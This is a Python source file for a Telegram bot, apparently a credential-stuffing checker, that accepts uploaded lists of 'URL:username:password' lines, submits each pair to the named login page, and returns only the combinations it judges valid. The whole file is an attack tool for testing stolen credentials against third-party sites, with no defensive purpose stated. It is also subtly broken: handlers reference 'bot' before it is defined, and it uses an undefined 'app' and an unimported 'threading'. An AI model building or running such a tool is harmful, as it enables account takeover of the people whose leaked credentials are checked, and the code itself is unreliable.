# app.py - Credential Checker Bot (Pyrogram Version)
import os
import sys
import asyncio
import aiohttp
from pyrogram import Client, filters
from pyrogram.types import Message, Document
from flask import Flask

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED_USER_ID = os.environ.get("ALLOWED_USER_ID", "")

# --- SECURITY CHECK ---
def is_allowed(user_id):
    if not ALLOWED_USER_ID or ALLOWED_USER_ID.strip() == "":
        return True
    allowed_ids = [x.strip() for x in ALLOWED_USER_ID.split(",") if x.strip()]
    return str(user_id) in allowed_ids

# --- Flask Health Server ---
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "✅ Credential Checker Bot is running and healthy!"

@flask_app.route("/health")
def health():
    return {"status": "healthy"}, 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    print(f"[Bot] Starting Flask health server on port {port}")
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

# --- PARSING LOGIC ---
def parse_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        colon_indices = [i for i, char in enumerate(line) if char == ':']
        if len(colon_indices) < 2:
            return None
        last_colon = colon_indices[-1]
        second_last_colon = colon_indices[-2]
        password = line[last_colon + 1:]
        username_email = line[second_last_colon + 1:last_colon]
        url_part = line[:second_last_colon]
        if not url_part.startswith('http://') and not url_part.startswith('https://'):
            url_part = 'https://' + url_part
        if not username_email or not password:
            return None
        return (url_part, username_email, password)
    except Exception as e:
        print(f"Error parsing line: {e}")
        return None

# --- CHECKING LOGIC ---
async def check_single_credential(session, url, user, password):
    try:
        payload = {
            "email": user,
            "username": user,
            "user": user,
            "login": user,
            "password": password
        }
        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
            status = response.status
            text = ""
            try:
                text = (await response.text()).lower()
            except:
                pass
            
            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden", "captcha", "verification"]
            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account", "profile", "home"]
            
            has_fail = any(term in text for term in fail_terms)
            has_success = any(term in text for term in success_terms)
            
            if has_fail:
                return False
            if has_success:
                return True
            if status in [301, 302, 303]:
                return True
            return False
    except Exception as e:
        print(f"Error checking credential: {e}")
        return False

# --- PROCESS FILE ---
IS_PROCESSING = False

async def process_file_task(client, chat_id, file_path):
    global IS_PROCESSING
    valid_results = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        IS_PROCESSING = False
        print(f"Error reading file: {e}")
        await client.send_message(chat_id=chat_id, text="❌ Error reading file.")
        if os.path.exists(file_path):
            os.remove(file_path)
        return

    total_lines = len(lines)
    if total_lines == 0:
        IS_PROCESSING = False
        await client.send_message(chat_id=chat_id, text="❌ The file is empty.")
        return

    await client.send_message(
        chat_id=chat_id, 
        text=f"⚙️ **Process Started**\n\nTotal lines to check: {total_lines}\n\nI will send progress updates every 5%. Please wait..."
    )

    connector = aiohttp.TCPConnector(limit=20)
    async with aiohttp.ClientSession(connector=connector) as session:
        count = 0
        valid_count = 0
        last_progress_report = 0
        
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                url, user, passw = parsed
                is_valid = await check_single_credential(session, url, user, passw)
                if is_valid:
                    valid_results.append(f"{url}:{user}:{passw}")
                    valid_count += 1
            
            count += 1
            progress_percent = int((count / total_lines) * 100)
            
            if progress_percent >= last_progress_report + 5 or count == total_lines:
                last_progress_report = progress_percent
                await client.send_message(
                    chat_id=chat_id, 
                    text=f"⏳ **Progress Update**\n\nChecked: {count}/{total_lines}\nProgress: {progress_percent}%\nValid Found So Far: {valid_count}\n\n*Please do not send another file until this process is complete.*"
                )

    IS_PROCESSING = False
    if valid_results:
        filename = "valid_credentials.txt"
        with open(filename, 'w') as f:
            f.write("\n".join(valid_results))
        
        await client.send_document(
            chat_id=chat_id,
            document=filename,
            caption=f"✅ **Process Complete!**\n\n"
                    f"📊 **Summary:**\n"
                    f"- Total Lines Checked: {count}\n"
                    f"- **Valid Credentials Found: {valid_count}**\n"
                    f"- Invalid/Skipped: {count - valid_count}\n\n"
                    f"📄 Download the file below for the valid list."
        )
        if os.path.exists(filename):
            os.remove(filename)
    else:
        await client.send_message(
            chat_id=chat_id, 
            text=f"🛑 **Process Complete**\n\n"
                 f"📊 **Summary:**\n"
                 f"- Total Lines Checked: {count}\n"
                 f"- **Valid Credentials Found: 0**\n\n"
                 f"No valid credentials were found."
        )

    if os.path.exists(file_path):
        os.remove(file_path)

# --- TELEGRAM HANDLERS ---
@bot.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    if not is_allowed(message.from_user.id):
        return
    await message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can validate thousands of credentials from a text file and return only the working ones.\n\n"
        "**How to use:**\n"
        "1. Prepare a `.txt` file with credentials in this format:\n"
        "   `https://site.com/login:email:password`\n"
        "2. Send the file to this chat.\n"
        "3. I will process it and send back a new file with **ONLY** valid credentials.\n\n"
        "⚠️ **Note:**\n"
        "- Progress updates will be sent every 5%.\n"
        "- Do not send multiple files at once."
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_command(client, message: Message):
    if not is_allowed(message.from_user.id):
        return
    await message.reply_text(
        "🆘 **Help & Usage**\n\n"
        "1. Create a text file with your credential list.\n"
        "2. Format must be `URL:username:password`.\n"
        "3. Send the file to me.\n"
        "4. Wait for the progress updates.\n"
        "5. Download the result file containing only valid credentials."
    )

@bot.on_message(filters.document & filters.private)
async def handle_document(client, message: Message):
    global IS_PROCESSING
    if not is_allowed(message.from_user.id):
        return
    if IS_PROCESSING:
        await message.reply_text("⚠️ **Busy!** I am currently processing another file. Please wait.")
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Invalid file type. Please send a `.txt` file only.")
        return
    
    file_path = "input_credentials.txt"
    try:
        await app.download_media(message.document, file_name=file_path)
    except Exception as e:
        await message.reply_text(f"❌ Failed to download file: {str(e)}")
        return
    
    IS_PROCESSING = True
    await message.reply_text("📥 File received. Starting validation process...")
    asyncio.create_task(process_file_task(client, message.chat.id, file_path))

# --- BOT CLIENT ---
bot = Client(
    "credential_checker_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workdir="/tmp",
)

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("CRITICAL ERROR: BOT_TOKEN is not set.")
        exit(1)
    
    if API_ID == 0 or not API_HASH:
        print("CRITICAL ERROR: API_ID and API_HASH are required. Get them from my.telegram.org")
        exit(1)
    
    # Start Flask health server in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Start the bot
    print("🚀 Starting Credential Checker Bot (Pyrogram)...")
    bot.run()
